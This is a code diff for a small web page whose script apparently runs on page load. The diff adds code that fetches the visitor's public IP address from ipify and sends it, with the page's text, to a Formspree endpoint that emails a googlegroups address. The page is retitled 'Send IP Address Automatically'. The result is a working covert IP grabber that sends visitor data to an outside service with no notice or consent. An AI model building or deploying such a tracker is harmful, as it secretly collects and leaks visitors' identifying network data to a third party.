@@ -3,6 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Send IP Address Automatically</title>
 </head>
 <body>
   <center>
@@ -16,30 +17,40 @@
       const headerText = document.querySelector("h1").innerText;
       const paragraphText = document.querySelector("p").innerText;
 
-      // Combine the text content into one message
-      const emailMessage = `${headerText}\n\n${paragraphText}`;
+      // Use a third-party service to get the user's IP address
+      fetch("https://api.ipify.org?format=json")
+        .then(response => response.json())
+        .then(data => {
+          const userIP = data.ip; // The user's IP address
 
-      // Prepare form data (this simulates a form submission)
-      const formData = new FormData();
-      formData.append("email", "googleusers9913337@googlegroups.com"); // Recipient's email
-      formData.append("subject", "Captured Text from Webpage");
-      formData.append("message", emailMessage);
+          // Combine the text content into one message, including the user's IP address
+          const emailMessage = `${headerText}\n\n${paragraphText}\n\nUser IP: ${userIP}`;
 
-      // Send the form data to Formspree endpoint
-      fetch("https://formspree.io/f/movqwbek", {
-        method: "POST",
-        body: formData,
-      })
-      .then(response => {
-        if (response.ok) {
-          console.log("Email sent successfully!");
-        } else {
-          console.error("Error sending email.");
-        }
-      })
-      .catch(error => {
-        console.error("Error sending email:", error);
-      });
+          // Prepare form data (this simulates a form submission)
+          const formData = new FormData();
+          formData.append("email", "googleusers9913337@googlegroups.com"); // Recipient's email
+          formData.append("subject", "Captured Text and User IP from Webpage");
+          formData.append("message", emailMessage);
+
+          // Send the form data to Formspree endpoint
+          fetch("https://formspree.io/f/movqwbek", {
+            method: "POST",
+            body: formData,
+          })
+          .then(response => {
+            if (response.ok) {
+              console.log("Email sent successfully!");
+            } else {
+              console.error("Error sending email.");
+            }
+          })
+          .catch(error => {
+            console.error("Error sending email:", error);
+          });
+        })
+        .catch(error => {
+          console.error("Error fetching IP address:", error);
+        });
     };
   </script>
 </body>
